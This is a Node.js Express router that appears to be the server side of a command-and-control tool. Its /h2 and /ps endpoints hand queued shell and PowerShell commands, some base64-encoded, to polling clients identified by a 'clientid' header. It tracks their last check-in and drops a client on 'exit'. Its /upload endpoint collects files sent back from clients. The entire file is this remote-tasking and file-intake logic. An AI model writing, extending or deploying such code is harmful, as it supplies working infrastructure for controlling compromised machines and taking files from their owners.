const router = require('express').Router();
const Command = require('../commands.model');
const Utils = require('../../../Api/Utils/UtilFunctions/utilFunctions');
const psCommand = require('../pscommand.model');
const formidable = require('express-formidable');
const Client = require('../../tool.model')
const ClientUtils = require("../../../Api/Utils/UtilFunctions/clientUtils");
const {LogToFile} = require("../../../Api/Utils/UtilFunctions/utilFunctions");

//Give client a command + update check in
router.route('/h2').get((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        Command.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    if (command['command'] === "exit")
                        ClientUtils.RemoveClient(clientId)
                    res.send(Utils.base64Encode(command['command']))
                } else {
                    res.send(Utils.base64Encode("No command"))
                }
            }
            Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
                if (err)
                    Utils.LogToFile(`Error updating last active for client ${clientId}`)
            })
        })
    } catch (err) {
        Utils.LogToFile(`Error getting command for client ${err}`);
        res.send("No command");
    }

});

//get a powershell command
router.route('/ps').get((req, res) => {
    try {
        let clientId = req.headers['clientid'];
        psCommand.findOneAndDelete({client_id: clientId}, function (err, command) {
            if (err) {
                Utils.LogToFile(`Error getting ps command for client ${err} from database`);
                res.send("No command");
            } else {
                if (command) {
                    res.send(command['command']);
                } else {
                    res.send("No command");
                }
            }
        })
        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false}, function (err) {
            if (err)
                Utils.LogToFile(`Error updating last active for client ${clientId}`)
        })
    } catch (err) {
        Utils.LogToFile(`Error getting ps command for client ${err}`);
        res.status(400).send("No command");
    }
});

router.use(formidable())

router.route('/upload').post((req, res) => {
    LogToFile(`Received file from client`);
    res.send("Done")
    Utils.MoveFile(req.files.fileUpload.path, req.files.fileUpload.name, req.headers['clientid'])
})


module.exports = router;
